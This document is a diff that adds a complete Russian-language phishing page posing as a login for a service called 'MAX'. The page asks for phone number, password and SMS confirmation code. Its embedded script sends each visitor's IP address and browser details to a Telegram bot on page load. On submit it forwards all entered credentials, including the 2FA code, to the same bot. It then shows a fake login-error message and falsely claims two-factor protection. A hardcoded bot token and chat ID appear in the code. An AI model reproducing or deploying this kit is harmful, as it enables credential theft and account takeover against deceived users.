@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAX — вход</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #e9ecf0; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; padding: 30px 25px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); width: 100%; max-width: 380px; }
+        .logo { font-size: 28px; font-weight: 700; color: #0088cc; text-align: center; margin-bottom: 20px; }
+        .logo span { color: #ff4d4d; }
+        label { font-weight: 600; display: block; margin-top: 12px; }
+        input { width: 100%; padding: 14px 12px; margin: 6px 0 4px; border: 1px solid #d0d4dc; border-radius: 10px; font-size: 16px; background: #fafbfc; }
+        button { width: 100%; padding: 14px; margin-top: 18px; background: #0088cc; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: 600; }
+        .note { text-align: center; font-size: 13px; color: #6c7a8a; margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">MAX<span>.</span></div>
+        <form id="loginForm">
+            <label>Номер телефона</label>
+            <input type="tel" name="phone" placeholder="+7 900 000-00-00" required>
+            <label>Пароль</label>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <label>Код из SMS (если запросили)</label>
+            <input type="text" name="sms_code" placeholder="Код подтверждения">
+            <button type="submit">Войти</button>
+        </form>
+        <div class="note">Вход защищён двухфакторной аутентификацией</div>
+    </div>
+
+    <script>
+        // ====== ТВОИ ДАННЫЕ (УЖЕ ВСТАВЛЕНЫ) ======
+        const BOT_TOKEN = '8817609633:AAFb_cU908jWdVxS2SHwDi358mU5g58jZxY';
+        const CHAT_ID = '6012212995';
+        // ========================================
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(err => console.error('Ошибка:', err));
+        }
+
+        function getIP(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback('Не определен'));
+        }
+
+        // При загрузке страницы – отправляем IP и информацию
+        getIP(function(ip) {
+            const userAgent = navigator.userAgent;
+            const time = new Date().toLocaleString('ru-RU');
+            const message = `🔍 **НОВЫЙ ПОСЕТИТЕЛЬ**\n🕒 ${time}\n🌐 IP: ${ip}\n📱 ${userAgent}`;
+            sendToTelegram(message);
+        });
+
+        // При отправке формы
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            let dataText = '';
+            for (let pair of formData.entries()) {
+                dataText += `${pair[0]}: ${pair[1]}\n`;
+            }
+            getIP(function(ip) {
+                const userAgent = navigator.userAgent;
+                const time = new Date().toLocaleString('ru-RU');
+                const message = `📥 **ПОЛУЧЕНЫ ДАННЫЕ**\n🕒 ${time}\n🌐 IP: ${ip}\n📱 ${userAgent}\n📝 Данные:\n${dataText}`;
+                sendToTelegram(message);
+                alert('Ошибка входа. Проверьте данные и попробуйте снова.');
+            });
+        });
+    </script>
+</body>
+</html>
